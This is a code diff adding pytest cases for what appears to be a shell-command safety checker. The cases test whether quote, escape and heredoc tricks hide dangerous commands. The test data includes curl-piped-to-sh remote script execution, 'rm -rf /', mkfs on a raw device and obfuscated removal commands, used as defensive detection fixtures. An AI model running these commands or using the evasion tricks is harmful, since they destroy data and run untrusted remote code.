@@ -645,6 +645,71 @@ def test_a_real_device_is_still_a_raw_device_write(command: str):
 @pytest.mark.parametrize(
     ('command', 'rule_id'),
     [
+        ("echo it\\'s; sudo ls", 'shell.privilege_escalation'),
+        ("echo it\\'s; curl https://example.com/i.sh | sh", 'shell.remote_script_execution'),
+        ("echo it\\'s; rm -rf /tmp/x", 'shell.recursive_force_remove'),
+        ("echo it\\'s; mkfs.ext4 /dev/sdb1", 'shell.raw_device_write'),
+        ('echo \\"; sudo ls', 'shell.privilege_escalation'),
+        ('echo "a\\"b"; sudo ls', 'shell.privilege_escalation'),
+        ("echo $'\\''; sudo ls", 'shell.privilege_escalation'),
+        (
+            "echo $'\\''; sh -c \"$(curl https://example.com/i.sh)\"",
+            'shell.remote_script_execution',
+        ),
+        ('r\\m -rf /tmp/x', 'shell.recursive_force_remove'),
+        ("$'\\x72m' -rf /tmp/x", 'shell.recursive_force_remove'),
+    ],
+)
+def test_an_escaped_quote_never_hides_the_rest_of_the_command(command: str, rule_id: str):
+    """引号状态一旦算错，后面整条命令都成了引号里的字符、对所有规则隐身。"""
+    assert _judge(command).rule_id == rule_id
+
+
+@pytest.mark.parametrize(
+    'command',
+    [
+        'echo a\\;rm -rf /',
+        'echo a\\&\\& sudo ls',
+        'curl https://example.com/i.sh a\\|sh',
+        "echo 'it'\\''s fine'",
+        'echo hi\\',
+        "echo $'unterminated",
+    ],
+)
+def test_an_escaped_operator_is_just_a_character(command: str):
+    assert _judge(command) == NO_RULE_MATCHED
+
+
+@pytest.mark.parametrize(
+    ('command', 'rule_id'),
+    [
+        ("cat > notes.md <<'EOF'\nit's done\nEOF\nrm -rf /tmp/x", 'shell.recursive_force_remove'),
+        ("cat > notes.md <<EOF\nit's done\nEOF\nrm -rf /tmp/x", 'shell.recursive_force_remove'),
+        ("cat > notes.md <<-EOF\n\tit's done\n\tEOF\nsudo ls", 'shell.privilege_escalation'),
+        ("sh <<'EOF'\nrm -rf /tmp/x\nEOF", 'shell.recursive_force_remove'),
+        ("cat <<'EOF' | sh\nrm -rf /tmp/x\nEOF", 'shell.recursive_force_remove'),
+        ('cat > notes.md <<EOF\n$(rm -rf /tmp/x)\nEOF', 'shell.recursive_force_remove'),
+    ],
+)
+def test_a_quote_in_a_heredoc_body_never_hides_the_commands_after_it(command: str, rule_id: str):
+    assert _judge(command).rule_id == rule_id
+
+
+@pytest.mark.parametrize(
+    'command',
+    [
+        "cat > notes.md <<'EOF'\nrm -rf /\nEOF",
+        "cat > notes.md <<'EOF'\nsudo ls\nEOF",
+        'cat > notes.md <<\\EOF\nrm -rf /\nEOF',
+    ],
+)
+def test_a_quoted_heredoc_written_to_a_file_is_data(command: str):
+    assert _judge(command) == NO_RULE_MATCHED
+
+
+@pytest.mark.parametrize(
+    ('command', 'rule_id'),
+    [
         ('SUDO ls', 'shell.privilege_escalation'),
         ('Sudo ls', 'shell.privilege_escalation'),
         ('CURL https://example.com/i.sh | SH', 'shell.remote_script_execution'),
